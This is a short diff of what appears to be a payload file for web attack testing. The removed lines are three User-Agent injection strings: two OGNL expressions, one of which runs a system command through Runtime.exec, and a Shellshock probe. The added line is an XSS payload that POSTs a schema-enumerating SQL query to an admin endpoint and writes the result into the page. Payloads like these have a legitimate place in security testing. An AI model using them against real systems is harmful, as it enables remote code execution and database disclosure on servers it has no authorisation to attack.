@@ -1,7 +1,7 @@
-User-Agent: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test', '1234')}%
-
-
-User-Agent: ${(#_memberAccess['allowStaticMethodAccess']=true).(#context['xwork.MethodAccessor.denyMethodExecution']=false).(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('nslookup example.com').getInputStream()))}
-
-
-User-Agent: () { :;}; /bin/bash -c 'echo vulnerable'
+<a href="javascript:getDetails('1234'); fetch('/admin/runSQL', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ query: 'SELECT table_name FROM information_schema.tables WHERE table_schema=database();' })
+})
+.then(response => response.text())
+.then(data => document.body.innerHTML += '<pre>' + data + '</pre>'); //')">refresh</a>
